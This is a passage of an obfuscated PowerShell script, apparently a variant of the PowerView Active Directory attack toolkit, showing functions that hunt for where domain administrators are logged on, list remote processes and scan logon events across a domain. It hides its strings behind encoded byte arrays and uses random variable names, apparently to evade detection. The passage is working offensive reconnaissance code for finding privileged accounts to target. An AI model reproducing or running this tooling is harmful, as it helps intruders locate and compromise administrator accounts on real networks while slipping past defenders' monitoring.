                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($Stealth) {
                Write-Verbose (ParseEntry20 @(217,67,76,155,140,219,8,46,150,150,206,4,124,197,135,224,57,77,181,147,238,30,72,131,143,212,58,118,147,146,224,5,68,142,151,230,18,44,198,161,238,66,43,132,176,223,50,47,148,231,218,27,87,191,155,224,19,112,173,185,239,30,83,202) @(140,112,30,247,213))
                Write-Verbose ((ParseEntry20 @(65,133,97,68,77,225,75,24,117,245,113,82,118,133,101,81,77,132,102,30,93,247,14,21) @(20,182,51,40)) + $StealthSource)
                ForEach ($Domain in $k8fkcV) {
                    if (($StealthSource -eq (ParseEntry20 @(154,11,249,80,89,100,16,105) @(200,102,149,35,3,53,45,84))) -or ($StealthSource -eq (ParseEntry20 @(36,113,203,177) @(117,38,179,194,133,124,244,217)))) {
                        Write-Verbose ((ParseEntry20 @(250,15,157,49,133,13,208,156,44,181,31,249,42,193,152,24,164,18,158,61,244,250,48,157,55,165,10,171) @(173,118,237,85,204,75,150)) + $Domain + (ParseEntry20 @(35,234,52,163,9,196,44,146,11,250,22,185,35,235,32,185,9,195,52,185,9,195,35,160,38,196,90,232) @(106,173,110,213)))
                        $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq (ParseEntry20 @(98,73,150,199) @(48,12,204,147,119,41,235,165))) -or ($StealthSource -eq (ParseEntry20 @(86,251,234,28) @(7,172,146,111,227,70,45,46)))) {
                        Write-Verbose ((ParseEntry20 @(72,236,193,248,204,89,211,128,198,221,85,160,208,203,176,113,220,246,206,243,125,194,247,236,231,118,212,140) @(31,149,177,156,133)) + $Domain + (ParseEntry20 @(250,255,229,72,83,128,136,115,225,212,242,89,101,219,156,79,215,213,233,71,83,144,254,67,255,223,130,3) @(179,184,191,62,48,233,202,54)))
                        $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) -or ($StealthSource -eq (ParseEntry20 @(34,164,252,105) @(115,243,132,26,198,28,218)))) {
                        Write-Verbose ((ParseEntry20 @(20,255,31,161,239,175,120,114,220,55,143,147,136,105,118,232,38,130,244,159,92,20,192,31,167,207,168,3) @(67,134,111,197,166,233,62)) + $Domain + (ParseEntry20 @(92,50,225,167,118,28,249,148,119,71,138,185,116,34,143,182,68,71,130,164,113,61,241,167,119,50,195,189,118,27,246,164,89,28,143,236) @(21,117,187,209)))
                        $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(153,109,141,106,66,136,82,204,84,83,132,33,156,89,62,160,93,186,92,125,172,67,187,126,105,167,85,192) @(206,20,253,14,11)) + $Domain + (ParseEntry20 @(75,191,40,152,97,145,48,129,96,203,60,222,97,143,79,211) @(2,248,114,238)))
                    $Z5nzf = @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ADSpath' = $ADSpath
                        'Filter' = $ComputerFilter
                        'Unconstrained' = $Unconstrained
                    }
                    $ComputerName += Get-NetComputer @Z5nzf
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (ParseEntry20 @(124,175,104,207,201,137,17,184,52,224,229,169,114,175,105,153,202,163,121,170) @(40,194,80,168,168,206))
            }
        }
        $TargetUsers = @()
        $CurrentUser = ([Environment]::UserName).toLower()
        if($ShowAll -or $ForeignUsers) {
            $qzuM = New-Object PSObject
            $qzuM | Add-Member Noteproperty 'MemberDomain' $Null
            $qzuM | Add-Member Noteproperty 'MemberName' '*'
            $TargetUsers = @($qzuM)
            if($ForeignUsers) {
                $IVlpSJDA = Convert-CanonicaltoNT4 -ObjectName ((ParseEntry20 @(216,133,205,147,221,241,227,202,232,247,186,199) @(185,182,135,250)) + $($Domain))
                $DomainShortName = $IVlpSJDA.split("\")[0]
            }
        }
        elseif($TargetServer) {
            Write-Verbose ((ParseEntry20 @(229,253,194,76,238,95,220,213,246,77,238,86,212,226,210,89,215,3,230,149,221,104,195,93,211,203,206,76,238,88,241,203) @(176,165,148,32,141,49)) + $TargetServer + (ParseEntry20 @(204,240,56,103,228,186,51,109,228,206,67,96,223,222,13,109,226,209,52,102,229,231,55,55) @(134,137,122,10)))
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $qzuM = New-Object PSObject
                $qzuM | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $qzuM | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                $qzuM
            }  | Where-Object {$_}
        }
        elseif($UserName) {
            Write-Verbose ((ParseEntry20 @(102,69,205,77,21,22,229,75,93,234,28,50,25,251,99,84,222,68,56,60,215,114,126,140,74,110,6,202,120,127,222,20) @(49,60,189,41,92,80,179)) + $UserName + (ParseEntry20 @(193,35,9,130,187,236,103,0) @(139,90,61,247,247)))
            $qzuM = New-Object PSObject
            $qzuM | Add-Member Noteproperty 'MemberDomain' $k8fkcV[0]
            $qzuM | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($qzuM)
        }
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {
                $qzuM = New-Object PSObject
                $qzuM | Add-Member Noteproperty 'MemberDomain' $k8fkcV[0]
                $qzuM | Add-Member Noteproperty 'MemberName' $_
                $qzuM
            }  | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter -or $AdminCount) {
            ForEach ($Domain in $k8fkcV) {
                $Z5nzf = @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $UserADSpath
                    'Filter' = $UserFilter
                    'AdminCount' = $AdminCount
                    'AllowDelegation' = $AllowDelegation
                }
                Write-Verbose ((ParseEntry20 @(162,224,137,66,0,105,154,196,195,161,108,124,78,139,192,247,176,97,27,89,190,162,223,137,68,32,110,225) @(245,153,249,38,73,47,220)) + $Domain + (ParseEntry20 @(157,23,51,238,55,189,18,88,251,102,130,41,10,239,105,233) @(212,80,105,152,84)))
                $TargetUsers += Get-NetUser @Z5nzf | ForEach-Object {
                    $qzuM = New-Object PSObject
                    $qzuM | Add-Member Noteproperty 'MemberDomain' $Domain
                    $qzuM | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $qzuM
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $k8fkcV) {
                Write-Verbose ((ParseEntry20 @(13,47,134,53,19,13,28,103,172,9,16,126,59,1,195,63,19,12,8,32,148,6,28,59,56,63,183,108) @(90,86,246,81,90,75)) + $Domain + (ParseEntry20 @(210,60,92,242,248,18,68,181,248,73,80,253,248,2,68,242,193,18,68,234,248,22,63,181,248,56,71,234) @(155,123,6,132)) + $GroupName + "'")
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }
        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw (ParseEntry20 @(69,32,84,97,245,238,57,100,16,90,83,198,241,84,88,35,91,66,230,221,104,69,108,121,76,244,249,122,91,17,92,105,229,243,70,120,56,81,71,209,201,63,91,49) @(18,89,18,5,188,171,12))
        }
        $s8TS = {
            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)
            $lPdgSYQ = $True
            if($Ping) {
                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($lPdgSYQ) {
                if(!$DomainShortName) {
                    $Ms1RF = Get-NetSession -ComputerName $ComputerName
                    ForEach ($BbCl in $Ms1RF) {
                        $UserName = $BbCl.sesi10_username
                        $fRC3aX = $BbCl.sesi10_cname
                        if($fRC3aX -and $fRC3aX.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
                            $fRC3aX = $fRC3aX.TrimStart("\")
                        }
                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {
                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {
                                $KqK0q2 = Get-IPAddress -ComputerName $ComputerName
                                $LWCSUOjd = New-Object PSObject
                                $LWCSUOjd | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
                                $LWCSUOjd | Add-Member Noteproperty 'UserName' $UserName
                                $LWCSUOjd | Add-Member Noteproperty 'ComputerName' $ComputerName
                                $LWCSUOjd | Add-Member Noteproperty 'IP' $KqK0q2
                                $LWCSUOjd | Add-Member Noteproperty 'SessionFrom' $fRC3aX
                                if ($CheckAccess) {
                                    $LuvpW8 = Invoke-CheckLocalAdminAccess -ComputerName $fRC3aX
                                    $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $LuvpW8
                                }
                                else {
                                    $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $LWCSUOjd
                            }
                        }                                    
                    }
                }
                if(!$Stealth) {
                    $Zad6A = Get-NetLoggedon -ComputerName $ComputerName
                    ForEach ($qzuM in $Zad6A) {
                        $UserName = $qzuM.wkui1_username
                        $of0NvYsD = $qzuM.wkui1_logon_domain
                        if (($UserName) -and ($UserName.trim() -ne '')) {
                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {
                                $fi738H = $True
                                if($DomainShortName) {
                                    if ($DomainShortName.ToLower() -ne $of0NvYsD.ToLower()) {
                                        $fi738H = $True
                                    }
                                    else {
                                        $fi738H = $False
                                    }
                                }
                                if($fi738H) {
                                    $KqK0q2 = Get-IPAddress -ComputerName $ComputerName
                                    $LWCSUOjd = New-Object PSObject
                                    $LWCSUOjd | Add-Member Noteproperty 'UserDomain' $of0NvYsD
                                    $LWCSUOjd | Add-Member Noteproperty 'UserName' $UserName
                                    $LWCSUOjd | Add-Member Noteproperty 'ComputerName' $ComputerName
                                    $LWCSUOjd | Add-Member Noteproperty 'IP' $KqK0q2
                                    $LWCSUOjd | Add-Member Noteproperty 'SessionFrom' $Null
                                    if ($CheckAccess) {
                                        $LuvpW8 = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                                        $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $LuvpW8
                                    }
                                    else {
                                        $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $LWCSUOjd
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(101,49,141,202,255,150,80,14,167,253,245,130,105,62,133,209,252,172,6,7,138,242,249,139,87,46,164,221,249,188,91,16,153,237,219,144,80,16,130,131,212,186,14,84) @(51,105,195,186,157,251)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'DomainShortName' = $DomainShortName
            }
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(40,14,229,179,125,57,37,227,179,115,57,4,220,144,1,78,21,194,157,88,28,30,215,161,110,22,53,253,142,7,45,7,241,186,97,24,22,210,238,78,27,63,216,225,125,62,74,168) @(127,119,149,215,52)) + $($ComputerName.count))
            $o6bG = 0
            ForEach ($mnZ6k in $ComputerName) {
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(36,80,133,149,12,54,127,128,149,18,66,69,150,156,3,67,72,162,196,43,58,97,187,157,38,29,115,153,146,44,50,20) @(115,41,245,241,69)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(148,161,5,17,152,146,183,224) @(221,230,60,124,209,211,138)) + $($ComputerName.count) + ")")
                $NW6jRjlY = Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
                $NW6jRjlY
                if($NW6jRjlY -and $StopOnSuccess) {
                    Write-Verbose (ParseEntry20 @(213,93,42,74,204,244,115,234,71,55,74,233,214,98,192,21,57,28,211,203,104,197,126,44,74,210,135,74,206,103,24,87,223,234,115,179,71,55,27,245,208,76,225,67,0,121,195,203,67,202,79,103) @(130,36,90,46,133,178,33))
                    return
                }
            }
        }
    }
}
function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        $CheckAccess,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [String]
        [ValidateSet((ParseEntry20 @(118,192,74,62) @(36,133,16,106,204,178,134,170)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(ParseEntry20 @(99,78,3,36,86,74,199,157) @(49,35,111,87,12,27,250,160)),(ParseEntry20 @(129,120,194,150) @(208,47,186,229,161,29)))]
        $StealthSource =(ParseEntry20 @(162,196,48,42) @(243,147,72,89,162,16))
    )
    Invoke-UserHunter -Stealth @PSBoundParameters
}
function Invoke-ProcessHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $ProcessName,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [String]
        $RemoteUserName,
        [String]
        $RemotePassword,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose ((ParseEntry20 @(35,143,191,111,137,130,15,69,148,162,62,176,166,40,23,145,156,92,245,246,39,70,130,163,71,150,134,60,22,196,129,103,163,247,11,61,146,152,62,240,158,29,61,145,171,57,172,244,36,55,180,164,81,151,188,45,17,165,141,125,154,173,4,73) @(116,246,207,11,192,196,69)) + $Delay)
        if($Domain) {
            $k8fkcV = @($Domain)
        }
        elseif($SearchForest) {
            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            $k8fkcV = @( (Get-NetDomain).name )
        }
        if(!$ComputerName) { 
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(108,53,124,70,225,239,240,20,97,20,70,23,201,254,131,75,114,11,94,84,202,254,240,85,89,37,77,31) @(59,76,12,34,168,169,182,37)) + $Domain + (ParseEntry20 @(158,194,225,194,137,133,149,234,217,135,164,220,180,242,134,137) @(215,133,187,180,234,236)))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (ParseEntry20 @(46,230,238,189,171,61,178,172,190,130,55,236,140,183,243,75,233,187,139,162) @(122,139,214,218,202))
            }
        }
        if(!$ProcessName) {
            Write-Verbose (ParseEntry20 @(26,246,100,93,86,6,209,42,99,7,24,225,63,67,119,59,194,11,11,89,7,211,18,77,111,25,213,44,96,88,34,247,6,121,66,41,194,50,108,69,44,220,14,74,87,35,248,59,99,102,12,171,5,98,127,32,193,4,107,82,42,195,18,86,86,39,217,38,96,109,31,166) @(78,155,92,58,53))
            $TargetUsers = @()
            if($TargetServer) {
                Write-Verbose ((ParseEntry20 @(59,92,23,144,218,0,104,49,158,212,13,99,37,187,255,23,94,115,170,137,39,76,15,144,218,0,94,45,159,208,47,106) @(110,4,65,252,185)) + $TargetServer + (ParseEntry20 @(10,248,34,68,130,141,255,39,227,39,16,138,231,225,55,230,4,113,174,210,213,46,204,93) @(64,129,96,41,224,190,182)))
                $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split("/")[1].toLower()
                }  | Where-Object {$_}
            }
            elseif($UserName) {
                Write-Verbose ((ParseEntry20 @(189,98,16,76,167,212,92,76,139,76,85,70,167,218,88,94,137,118,4,68,138,209,72,7,137,41,54,81,167,209,105,11) @(234,27,96,40,238,146,10,54)) + $UserName + (ParseEntry20 @(188,26,252,99,101,133,176,203) @(246,99,200,22,41,226,141)))
                $TargetUsers = @( $UserName.ToLower() )
            }
            elseif($UserFile) {
                $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(46,56,237,52,48,7,219,97,35,25,215,101,24,22,168,62,48,6,207,38,27,22,219,32,27,40,220,109) @(121,65,157,80)) + $Domain + (ParseEntry20 @(219,210,139,150,104,88,86,163,246,227,182,114,82,99,175,168) @(146,149,209,224,11,49,20)))
                    $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }            
            }
            else {
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(181,183,101,209,171,136,83,132,184,150,95,128,131,153,32,219,171,137,71,195,128,153,83,197,128,167,84,136) @(226,206,21,181)) + $Domain + (ParseEntry20 @(231,132,112,138,217,121,206,159,160,24,170,195,115,245,236,181,112,149,248,126,239,195,250,27,159,249,81,226) @(174,195,42,252,186,16,140)) + $GroupName + "'")
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController| Foreach-Object {
                        $_.MemberName
                    }
                }
            }
            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw (ParseEntry20 @(164,204,125,77,186,240,14,95,186,253,109,83,169,237,113,83,186,242,97,95,151,226,14,66,186,253,105,95,186,253,117,69,170,237,113,67,146,246,121,68,145,134,114,65) @(243,181,59,41))
            }
        }
        $s8TS = {
            param($ComputerName, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)
            $lPdgSYQ = $True
            if($Ping) {
                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($lPdgSYQ) {
                if($RemoteUserName -and $RemotePassword) {
                    $x3yp9 = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                else {
                    $x3yp9 = Get-NetProcess -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                ForEach ($Process in $x3yp9) {
                    if($ProcessName) {
                        $ProcessName.split(",") | ForEach-Object {
                            if ($Process.ProcessName -match $_) {
                                $Process
                            }
                        }
                    }
                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(18,179,8,138,38,134,37,157,32,172,46,131,30,188,0,145,37,188,115,148,13,163,34,138,32,172,33,157,32,172,46,131,30,188,0,145,39,146,7,195,13,170,123,199) @(68,235,70,250)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = $TargetUsers
                'RemoteUserName' = $RemoteUserName
                'RemotePassword' = $RemotePassword
            }
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(37,247,83,204,0,111,188,8,22,201,101,219,0,110,219,79,16,217,105,196,42,64,172,8,40,231,97,192,16,26,188,14,22,227,118,207,40,110,215,4,22,198,110,158,0,104,211,67) @(114,142,35,168,73,41,238,126)) + $($ComputerName.count))
            $o6bG = 0
            ForEach ($mnZ6k in $ComputerName) {
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(191,39,201,215,222,47,6,230,140,9,136,223,244,7,22,163,137,9,140,221,222,34,30,255,139,48,227,223,244,3,17,174) @(232,94,185,179,151,106,80,147)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(87,188,237,121,47,230,182,35) @(30,251,212,20,102,167,139)) + $($ComputerName.count) + ")")
                $NW6jRjlY = Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
                $NW6jRjlY
                if($NW6jRjlY -and $StopOnSuccess) {
                    Write-Verbose (ParseEntry20 @(51,146,233,218,95,169,191,180,7,134,253,210,114,172,175,237,7,217,207,199,90,220,175,165,6,217,215,210,117,220,160,187,62,134,160,143,116,130,188,175,45,163,211,210,114,167,187,165,6,134,245,203,76,150,175,176,61,179,211,205,115,190,208,225) @(100,235,153,190,22,239,237,220))
                    return
                }
            }
        }
    }
}
function Invoke-EventHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Int32]
        $SearchDays = 3,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose (ParseEntry20 @(99,211,222,223,80,229,126,155,204,214,44,211,86,199,205,220,74,244,1,152,204,137,109,207,120,255,248,137,67,244,1,154,253,243,79,214,80,237,248,194) @(52,170,174,187,25,163))
        if($Domain) {
            $k8fkcV = @($Domain)
        }
        elseif($SearchForest) {
            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            $k8fkcV = @( (Get-NetDomain).name )
        }
        if(!$ComputerName) { 
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(179,205,155,92,187,162,242,218,98,170,174,129,138,111,199,138,253,172,106,132,134,227,173,72,144,141,245,214) @(228,180,235,56,242)) + $Domain + (ParseEntry20 @(148,137,65,114,209,180,140,116,102,129,147,254,120,115,143,224) @(221,206,27,4,178)))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(181,177,23,228,212,43,244,108,184,144,45,181,252,58,135,51,171,143,53,246,255,58,244,45,128,161,38,189) @(226,200,103,128,157,109,178,93)) + $Domain + (ParseEntry20 @(180,250,181,209,205,148,255,132,197,156,204,213,142,240,154,154,228,221,158,219,153,245,165,209,204,186,197,131,196,192,176,128) @(253,189,239,167,174)))
                    $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (ParseEntry20 @(16,99,13,154,196,7,125,116,81,181,232,39,30,99,12,204,199,45,21,102) @(68,14,53,253,165,64))
            }
        }
        $TargetUsers = @()
        if($TargetServer) {
            Write-Verbose ((ParseEntry20 @(101,230,61,63,95,106,188,64,220,6,48,91,96,151,118,199,49,97,106,52,153,120,240,7,48,82,94,188,83,215,42,61) @(48,190,107,83,60,4,208)) + $TargetServer + (ParseEntry20 @(2,145,133,9,61,121,13,2,42,175,254,14,6,29,51,2,44,176,137,8,60,36,9,88) @(72,232,199,100,95,74,68,101)))
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split("/")[1].toLower()
            }  | Where-Object {$_}
        }
        elseif($UserName) {
            Write-Verbose ((ParseEntry20 @(175,142,108,53,175,236,174,141,125,6,211,196,177,191,78,57,133,199,156,155,120,18,164,155,155,197,74,40,175,233,155,202) @(248,247,28,81,230,170)) + $UserName + (ParseEntry20 @(98,74,88,157,100,84,81,213) @(40,51,108,232)))
            $TargetUsers = @( $UserName.ToLower() )
        }
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in $k8fkcV) {
                Write-Verbose ((ParseEntry20 @(248,84,76,238,34,63,233,28,102,210,33,76,206,122,9,228,34,62,253,91,94,221,45,9,205,68,125,183) @(175,45,60,138,107,121)) + $Domain + (ParseEntry20 @(77,248,63,111,248,109,253,84,122,169,82,198,6,110,166,57) @(4,191,101,25,155)))
                $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $k8fkcV) {
                Write-Verbose ((ParseEntry20 @(254,7,232,195,126,170,37,106,243,38,210,146,86,187,86,53,224,57,202,209,85,187,37,43,203,23,217,154) @(169,126,152,167,55,236,99,91)) + $Domain + (ParseEntry20 @(120,122,74,158,213,88,127,33,139,132,103,68,115,145,244,71,103,121,170,216,82,80,41,217,213,114,124,126) @(49,61,16,232,182)) + $GroupName + "'")
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController | Foreach-Object {
                    $_.MemberName
                }
            }
        }
        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw (ParseEntry20 @(151,220,93,36,117,115,245,211,82,8,106,76,154,253,81,58,117,113,154,211,127,23,9,93,137,237,73,54,117,126,142,201,66,24,118,92,161,230,89,45,94,5,137,205) @(192,165,27,64,60,54))
        }
        $s8TS = {
            param($ComputerName, $Ping, $TargetUsers, $SearchDays)
            $lPdgSYQ = $True
            if($Ping) {
                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($lPdgSYQ) {
                Get-UserEvent -ComputerName $ComputerName -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
                    $TargetUsers -contains $_.UserName
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(200,166,101,15,126,111,253,153,79,56,116,123,196,169,109,20,125,85,171,144,98,55,120,114,250,185,76,24,120,69,246,135,113,40,90,105,253,135,106,70,85,67,163,195) @(158,254,43,127,28,2)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'SearchDays' = $SearchDays
            }
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
